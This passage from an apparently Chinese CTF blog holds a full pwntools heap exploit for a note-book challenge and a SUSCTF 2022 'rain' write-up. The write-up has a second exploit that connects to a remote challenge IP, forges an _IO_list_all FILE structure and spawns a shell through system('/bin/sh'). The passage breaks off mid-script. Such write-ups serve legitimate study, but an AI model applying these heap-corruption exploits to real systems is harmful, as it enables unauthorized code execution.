<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#sh= process([&quot;./ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please Write U Name on the Book\n\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Number of words?&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input U character&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input the page U want 2 change&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now Change U this page : &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input the page U want 2 tear off&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;tear_off Finished\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input The page U want 2 scan&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0x8a0</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc.address=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5 -&gt;1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x448</span>,flat(&#123;<span class="number">0x440</span>:<span class="string">&quot;\x01&quot;</span>&#125;))<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#12</span></span><br><span class="line">    show(<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ce0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#13</span></span><br><span class="line">    <span class="comment"># free(1)</span></span><br><span class="line">    <span class="comment"># io_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#14</span></span><br><span class="line">    <span class="comment"># edit(5,p64(0)+p64(io_list_all-0x10)+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># free(13)</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#15</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    edit(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0x8b0</span>))</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#18</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#19-&gt;15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#20</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#21</span></span><br><span class="line">    io_list_all=libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#22</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(<span class="number">2</span>)+p64(binsh_addr)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xa8</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(libc_base+<span class="number">0x3e8360</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    <span class="comment"># pay = &#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)</span></span><br><span class="line">    <span class="comment"># pay+= p64((libc.search(&#x27;/bin/sh&#x27;).next()-100)/2+1)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64((libc.search(&#x27;/bin/sh&#x27;).next()-100)/2)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*12</span></span><br><span class="line">    <span class="comment"># pay+= p64(2)</span></span><br><span class="line">    <span class="comment"># pay+= p64(3)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0xffffffff)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64(libc.address+0x3e8360)</span></span><br><span class="line">    <span class="comment"># pay+= p64(libc.sym[&#x27;system&#x27;])</span></span><br><span class="line">    edit(<span class="number">19</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/SUSCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/02/SUSCTF/" class="post-title-link" itemprop="url">SUSCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-02 15:16:21 / 修改时间：15:16:38" itemprop="dateCreated datePublished" datetime="2022-03-02T15:16:21+08:00">2022-03-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SUSCTF-PWN"><a href="#SUSCTF-PWN" class="headerlink" title="SUSCTF  PWN"></a>SUSCTF  PWN</h1><h2 id="rain"><a href="#rain" class="headerlink" title="rain"></a>rain</h2><p>程序代码量比较大，看懂程序的逻辑就浪费了一些时间，然后我眼睛瞎了那么大的漏洞我都没看见</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v7 = <span class="built_in">realloc</span>(*((<span class="keyword">void</span> **)a1 + <span class="number">7</span>), v6 - <span class="number">18</span>);</span><br></pre></td></tr></table></figure>

<p>我第一次把v7看成了a[7]，后面反复看代码的时候也没有注意这个，导致我一直没找见漏洞，在ayoung佬的提示下才发现，眼睛真的瞎了，然后在他的提示下发现远程版本的libc库还没有tcache保护，导致可以直接doublefree</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.rain的远程版本是libc2.7.so_1.2的，这个版本的tcache是没有key字段的，然后这个版本的io——list_all也是攻击的的，key字段的引入在libc2.27_1.3</span><br><span class="line">2.了解到unsortedbin的具体失效版本是libc2.29</span><br></pre></td></tr></table></figure>

<p>然后rain以后a[7]会清零，相当于拥有多个指针的ufa,直接利用，唯一麻烦的是指定运行库以后运行rain程序会退出，当时自己盲打了一会，ayoung佬给了我patch掉rain的程序，死高一，我都快忘了这个东西了。</p>
<p>结合上面的漏洞就是普通的tcache的ufa,可以修改任一地址，我修改的io_list_all指向堆，然后堆布置，这是完整代码.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&#x27;, &#x27;./ttt&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">sh=remote(<span class="string">&quot;124.71.185.75&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">ogg=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">config</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>,timeout=<span class="number">6000</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;FRAME&gt; &#x27;</span>,timeout=<span class="number">6000</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span>():</span></span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x150</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x60</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rain</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>,timeout=<span class="number">6000</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    payload=p32(<span class="number">20</span>)+p32(<span class="number">20</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x0000000000401694&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        m()</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xe0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Table:            &#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    <span class="comment"># payload=p32(0x100)+p32(0x100)+&#x27;\x02&#x27;+&#x27;\x01&#x27;</span></span><br><span class="line">    <span class="comment"># payload+=p32(300)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(18,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+libc.sym[&#x27;__malloc_hook&#x27;]+0x10+96)*2</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0x50+18,&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment"># config(payload)</span></span><br><span class="line">    rain()</span><br><span class="line">    payload=p32(<span class="number">20</span>)+p32(<span class="number">20</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xe0</span>+<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    payload=p32(<span class="number">20</span>)+p32(<span class="number">20</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Table:            &quot;</span>)</span><br><span class="line">    heap_addr = u64(sh.recv(<span class="number">4</span>)+<span class="string">&quot;\x00&quot;</span>*<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line">    rain()</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line">    payload=payload.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    rain()</span><br><span class="line">    libc.address=libc_base</span><br><span class="line">    pay=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    pay+=p32(<span class="number">4</span>)</span><br><span class="line">    pay=pay.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">    pay+= p64(<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">3</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">    pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    pay=pay.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(pay)</span><br><span class="line">    rain()</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(heap_addr)</span><br><span class="line">    payload=payload.ljust(<span 